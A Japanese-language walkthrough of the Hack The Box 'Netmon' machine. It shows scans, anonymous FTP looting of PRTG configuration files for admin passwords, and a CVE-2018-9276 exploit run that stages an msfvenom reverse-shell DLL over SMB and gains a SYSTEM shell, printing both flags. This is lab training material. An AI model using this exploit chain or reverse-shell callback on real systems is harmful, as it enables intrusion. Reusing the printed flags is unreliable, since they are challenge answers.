https://app.hackthebox.com/machines/Netmon

## STEP 1
ftpのanonymousログインが可能
```sh
└─$ rustscan -a 10.129.230.176 --scripts none
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
TreadStone was here 

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.230.176:21
Open 10.129.230.176:80
Open 10.129.230.176:135
Open 10.129.230.176:139
Open 10.129.230.176:445
Open 10.129.230.176:5985
Open 10.129.230.176:47001
Open 10.129.230.176:49664
Open 10.129.230.176:49665
Open 10.129.230.176:49666
Open 10.129.230.176:49667
Open 10.129.230.176:49668
Open 10.129.230.176:49669
10.129.230.176 -> [21,80,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669]
```
```sh
└─$ nmap -n -Pn -p21 -sV --script=ftp-anon 10.129.230.176
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-16 07:10 EDT
Nmap scan report for 10.129.230.176
Host is up (0.50s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-03-19  12:18AM                 1024 .rnd
| 02-25-19  10:15PM       <DIR>          inetpub
| 07-16-16  09:18AM       <DIR>          PerfLogs
| 02-25-19  10:56PM       <DIR>          Program Files
| 02-03-19  12:28AM       <DIR>          Program Files (x86)
| 02-03-19  08:08AM       <DIR>          Users
|_11-10-23  10:20AM       <DIR>          Windows
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 3.58 seconds
```


## STEP 2
ftpでファイル探索  
ユーザフラグはゲット！  
ルートフラグは権限不足で確認できず
```sh
└─$ tnftp -a 10.129.17.67
Connected to 10.129.17.67.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
230 User logged in.
Remote system type is Windows_NT.


ftp> more Users\\Public\\Desktop\\user.txt
c5a3c0462ce87b64857fbbff23d35c55


ftp> cd Users\\Administrator
550 Access is denied.
```


## STEP 3
80番にアクセス  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Netmon_01.png" width="100%" height="100%">  
PRTG Network Monitor には CVE-2018-9276 が存在し、Webコンソール画面からOSコマンドインジェクションできるらしい  
この脆弱性を悪用するためにクレデンシャルが必要なのでftp上で探す  
[公式サイト](https://www.paessler.com/manuals/prtg/login#:~:text=When%20you%20log%20in%20for,should%20change%20the%20default%20password.)で確認できるデフォルトクレデンシャルではログインできず  
[このサイト](https://kb.paessler.com/en/topic/62202-where-are-stored-passwords-saved)から、パスワードはどうやら「configuration.dat」に保存されている（暗号化されているっぽい）と判明  
[このサイト](https://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data)から、パスは「%programdata%\Paessler\PRTG Network Monitor\configuration.dat」にあると判明 
```sh
└─$ tnftp -a 10.129.17.67
Connected to 10.129.17.67.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
230 User logged in.
Remote system type is Windows_NT.


ftp> binary 
200 Type set to I.


ftp> get "programdata\\paessler\\PRTG Network Monitor\\PRTG Configuration.dat"
local: programdata\\paessler\\PRTG Network Monitor\\PRTG Configuration.dat remote: programdata\\paessler\\PRTG Network Monitor\\PRTG Configuration.dat
229 Entering Extended Passive Mode (|||50920|)
125 Data connection already open; Transfer starting.
100% |***********************************************************************************************************************************************************************************************|  1161 KiB  227.12 KiB/s    00:00 ETA
226 Transfer complete.
1189697 bytes received in 00:05 (216.26 KiB/s)
```
パスワードぽいもの発見、やっぱり暗号化されている
```xml
<login>
   prtgadmin
 </login>
 <name>
   PRTG System Administrator
 </name>
 <ownerid>
   100
 </ownerid>
 <password>
   <flags>
     <encrypted/>
   </flags>
   <cell col="0" crypt="PRTG">
     JO3Y7LLK7IBKCMDN3DABSVAQO5MR5IDWF3MJLDOWSA======
   </cell>
   <cell col="1" crypt="PRTG">
     OEASMEIE74Q5VXSPFJA2EEGBMEUEXFWW
   </cell>
 </password>
```
同フォルダ内にバックアップファイルものがあったのでダウンロード
```sh
ftp> get "programdata\\paessler\\PRTG Network Monitor\\PRTG Configuration.old.bak"
local: PRTG Configuration.old.bak remote: PRTG Configuration.old.bak
229 Entering Extended Passive Mode (|||59224|)
125 Data connection already open; Transfer starting.
100% |***********************************************************************************************************************************************************************************************|  1126 KiB   20.86 KiB/s    00:00 ETA
226 Transfer complete.
1153755 bytes received in 00:54 (20.76 KiB/s)
```
あらあら平文のクレデンシャル発見
```xml
<dbpassword>
 <!-- User: prtgadmin -->
 PrTg@dmin2018
</dbpassword>
```
このクレデンシャルでWebログインしたが失敗  
ここでこのクレデンシャルは2018年に作成されたコンフィグのバックアップファイル  
現在のコンフィグは2019年に作成なので、「PrTg@dmin2018」でなく「PrTg@dmin2019」と推測ができたりできなかったり  
実際に「PrTg@dmin2019」でログインすると成功した！（このパスワード推測CTFっぽいね）
```sh
└─$ ls -l 'PRTG Configuration.dat' 'PRTG Configuration.old.bak' 
-rw-rw-r-- 1 kali kali 1189697 Feb 25  2019 'PRTG Configuration.dat'
-rw-rw-r-- 1 kali kali 1153755 Jul 14  2018 'PRTG Configuration.old.bak'
```


## STEP 4
PoCの仕組みは、`msfvenom`でリバースシェルのDLLを作成し、`impacket-smbserver`でDLLをアップロード  
CVE-2018-9276のOSコマンドインジェクションでDLLをrundllで実行させ、リバースシェル取得するかんじ  
ルートフラグゲット！
```sh
└─$ wget https://raw.githubusercontent.com/A1vinSmith/CVE-2018-9276/refs/heads/main/exploit.py
--2025-04-18 02:21:32--  https://raw.githubusercontent.com/A1vinSmith/CVE-2018-9276/refs/heads/main/exploit.py
Connecting to 192.168.20.37:8080... connected.
Proxy request sent, awaiting response... 200 OK
Length: 16049 (16K) [text/plain]
Saving to: ‘exploit.py’

exploit.py                                                 100%[========================================================================================================================================>]  15.67K  --.-KB/s    in 0.001s  

2025-04-18 02:21:33 (18.0 MB/s) - ‘exploit.py’ saved [16049/16049]

                                                                                                                                                                                                                                            
└─$ python3.13 exploit.py                                                                                                          
/home/kali/htb/exploit.py:259: SyntaxWarning: invalid escape sequence '\{'
  print(event + "Hosting payload at [\\\\{}\{}]".format(lhost, shareName))
usage: exploit.py [-h] -i HOST -p PORT --lhost LHOST --lport LPORT [--user USER] [--password PASSWORD] [--https]
exploit.py: error: the following arguments are required: -i/--host, -p/--port, --lhost, --lport
                                                                                                                                                                                                                                            

└─$ python3.13 exploit.py -i 10.129.17.67 -p 80 --lhost 10.10.16.5 --lport 4444 --user "prtgadmin" --password "PrTg@dmin2019"
/home/kali/htb/exploit.py:259: SyntaxWarning: invalid escape sequence '\{'
  print(event + "Hosting payload at [\\\\{}\{}]".format(lhost, shareName))
[+] [PRTG/18.1.37.13946] is Vulnerable!

[*] Exploiting [10.129.17.67:80] as [prtgadmin/PrTg@dmin2019]
[+] Session obtained for [prtgadmin:PrTg@dmin2019]
[+] File staged at [C:\Users\Public\tester.txt] successfully with objid of [2018]
[+] Session obtained for [prtgadmin:PrTg@dmin2019]
[+] Notification with objid [2018] staged for execution
[*] Generate msfvenom payload with [LHOST=10.10.16.5 LPORT=4444 OUTPUT=/tmp/bkdpccjp.dll]
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of dll file: 9216 bytes
/home/kali/htb/exploit.py:294: DeprecationWarning: setName() is deprecated, set the name attribute instead
  impacket.setName('Impacket')
/home/kali/htb/exploit.py:295: DeprecationWarning: setDaemon() is deprecated, set the daemon attribute instead
  impacket.setDaemon(True)
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Hosting payload at [\\10.10.16.5\IUGMYMBK]
[+] Session obtained for [prtgadmin:PrTg@dmin2019]
[+] Command staged at [C:\Users\Public\tester.txt] successfully with objid of [2019]
[+] Session obtained for [prtgadmin:PrTg@dmin2019]
[+] Notification with objid [2019] staged for execution
[*] Attempting to kill the impacket thread
[-] Impacket will maintain its own thread for active connections, so you may find it's still listening on <LHOST>:445!
[-] ps aux | grep <script name> and kill -9 <pid> if it is still running :)
[-] The connection will eventually time out.

[+] Listening on [10.10.16.5:4444 for the reverse shell!]
listening on [any] 4444 ...
[*] Incoming connection (10.129.17.67,59854)
[*] AUTHENTICATE_MESSAGE (\,NETMON)
[*] User NETMON\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
[*] Disconnecting Share(1:IPC$)
connect to [10.10.16.5] from (UNKNOWN) [10.129.17.67] 59867
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.


C:\Windows\system32>whoami
whoami
nt authority\system


C:\Windows\system32>cat 'c:\Users\Administrator\Desktop\root.txt'
cat 'c:\Users\Administrator\Desktop\root.txt'
74857cea503cf62366e036300f64b6c8


C:\Windows\system32>exit
[*] Disconnecting Share(2:IUGMYMBK)
exit
[*] Closing down connection (10.129.17.67,59854)
[*] Remaining connections []
```
